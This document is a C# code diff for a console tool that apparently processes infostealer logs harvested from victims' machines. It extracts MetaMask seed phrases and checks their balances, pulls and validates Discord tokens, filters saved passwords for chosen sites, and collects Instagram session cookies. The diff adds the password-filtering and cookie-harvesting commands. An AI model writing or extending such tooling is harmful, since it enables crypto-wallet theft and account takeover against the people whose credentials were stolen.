@@ -1,3 +1,4 @@
+using Console.Extensions;
 using Console.Models;
 using Console.Models.Abstractions;
 using Console.Models.Attributes;
@@ -24,16 +25,18 @@ public class MainView : ArgsView
     {
         Directory.CreateDirectory("Wallets");
 
-        using var mnemonics = new StreamWriter("Wallets/mnemonics.txt", new FileStreamOptions
+        await using var mnemonics = new StreamWriter("Wallets/mnemonics.txt", new FileStreamOptions
         {
-            Access = FileAccess.Write,
+            Access = FileAccess.ReadWrite,
             Mode = FileMode.OpenOrCreate,
         });
+        mnemonics.BaseStream.Position = mnemonics.BaseStream.Length;
         var checker = new MetamaskChecker(_config["Web3:Eth"]!, _config["Web3:Bsc"]!);
         
         foreach (var wallet in new MetamaskParser().ByLogs(_settings.Path).DistinctBy(x => x?.Mnemonic))
         {
-            if (wallet is not {Mnemonic:not null, Password:not null}) continue;
+            if (wallet is not {Mnemonic:not null, Password:not null} ||
+                wallet.Mnemonic.Split(' ').Length != 12) continue;
             
             System.Console.WriteLine(wallet.Mnemonic);
             await mnemonics.WriteLineAsync(wallet.Mnemonic);
@@ -49,9 +52,8 @@ public class MainView : ArgsView
                 }
             }
         }
-        
-        System.Console.WriteLine("Press any key for continue");
-        System.Console.ReadKey(true);
+
+        _ExitWait();
     }
 
     [Command]
@@ -61,23 +63,18 @@ public class MainView : ArgsView
         
         StreamWriter? all, invalid = null, valid = null;
 
-        var options = new FileStreamOptions
-        {
-            Access = FileAccess.Write,
-            Mode = FileMode.OpenOrCreate,
-        };
         var checker = new DiscordChecker();
         
         System.Console.WriteLine("Check tokens? [Y/N]"); // todo add check proxies
 
         var check = System.Console.ReadKey(true).Key == ConsoleKey.Y;
 
-        all = new StreamWriter("Discord/tokens.txt", options);
+        all = new StreamWriter("Discord/tokens.txt", true);
         
         if (check)
         {
-            invalid = new StreamWriter("Discord/invalid.txt", options);
-            valid = new StreamWriter("Discord/valid.txt", options);
+            invalid = new StreamWriter("Discord/invalid.txt", true);
+            valid = new StreamWriter("Discord/valid.txt", true);
         }
 
         foreach (var token in new DiscordParser().ByLogs(_settings.Path).Distinct())
@@ -98,10 +95,72 @@ public class MainView : ArgsView
         all.Dispose();
         invalid?.Dispose();
         valid?.Dispose();
+
+        _ExitWait();
+        return Task.CompletedTask;
+    }
+
+    [Command]
+    public Task Links()
+    {
+        Directory.CreateDirectory("Links");
+
+        using var writer = new StreamWriter("Links/links.txt", true);
+        var links = File.ReadAllLines("links.txt");
         
+        foreach (var log in Directory.GetDirectories(_settings.Path))
+        {
+            var passwords = Path.Combine(log, "Passwords.txt");
+            
+            if (!File.Exists(passwords)) continue;
+
+            using var reader = new StreamReader(passwords);
+
+            reader.ReadAccounts(
+                urlPredicate: url => links.Any(url.Contains),
+                func: account =>
+                {
+                    System.Console.WriteLine(account.ToString());
+                    writer.WriteLine(account.ToString());
+                }
+            );
+        }
+
+        _ExitWait();
+        return Task.CompletedTask;
+    }
+
+    [Command]
+    public Task Instagram()
+    {
+        var folder = $"Cookies/{new DirectoryInfo(_settings.Path).Name}";
+        Directory.CreateDirectory(folder);
+
+        int i = 0;
+        foreach (var log in Directory.GetDirectories(_settings.Path))
+        {
+            if (!Directory.Exists(Path.Combine(log, "Cookies"))) continue;
+            
+            foreach (var cookies in Directory.GetFiles(Path.Combine(log, "Cookies")))
+            {
+                var lines = File.ReadLines(cookies).Where(x => x.StartsWith(".instagram.com"));
+                
+                if (!lines.Any()) continue;
+
+                File.WriteAllLines($"{folder}/cookies{i}.txt", lines);
+
+                i++;
+            }
+        }
+        
+        _ExitWait();
+        return Task.CompletedTask;
+    }
+    
+    private static void _ExitWait()
+    {
+        System.Console.Beep();
         System.Console.WriteLine("Press any key for continue");
         System.Console.ReadKey(true);
-        
-        return Task.CompletedTask;
     }
 }
